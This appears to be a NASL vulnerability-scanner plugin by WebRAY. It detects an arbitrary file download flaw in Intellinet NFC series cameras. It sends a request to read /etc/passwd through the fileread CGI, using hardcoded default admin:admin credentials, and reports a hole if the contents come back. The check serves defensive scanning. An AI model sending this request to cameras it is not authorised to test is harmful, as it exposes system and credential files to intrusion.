############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799091);
 name = "Intellinet NFC series camera fileread - arbitrary file download";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"High");
 script_set_attribute(attribute:"description", value:"There is an arbitrary file download vulnerability in fileread file filepath parameter of intellinet NFC series camera. With a weak password vulnerability, arbitrary files of the system can be downloaded, threatening the security of the server.");
 script_set_attribute(attribute:"solution", value:"1. Limited directory. 2. The white list restricts the readable path.");
 script_end_attributes();
 exit(0);
}


#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");


function check_vuln(port){
	host1 = get_host_name( );
	if( port==80 ) host=host1;
        else host = string(host1,":",port);
	
	req = 'GET /cgi-bin/admin/fileread?READ.filePath=/etc/passwd HTTP/1.1\r\n' +
	'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
	  'Accept-Encoding: gzip, deflate\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Connection: close\r\n' +
	  'Referer: http://' + host + '/system_info.htm\r\n' +
	  'If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT\r\n' +
      'Cookie: VideoFmt=3\r\n' +
      'Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n';
     
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	con = req + buf;
	if( "200 O"><buf && "root:"><buf ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	host1 = get_host_name( );
	if( port==443 ) host=host1;
        else host = string(host1,":",port);
	req = 'GET /cgi-bin/admin/fileread?READ.filePath=/etc/passwd HTTP/1.1\r\n' +
	'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
	  'Accept-Encoding: gzip, deflate\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Connection: close\r\n' +
	  'Referer: http://' + host + '/system_info.htm\r\n' +
	  'If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT\r\n' +
      'Cookie: VideoFmt=3\r\n' +
      'Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n';
    
	ssl_req = https_req_get(port:port,request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if( "200 O"><ssl_req && "root:"><ssl_req ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}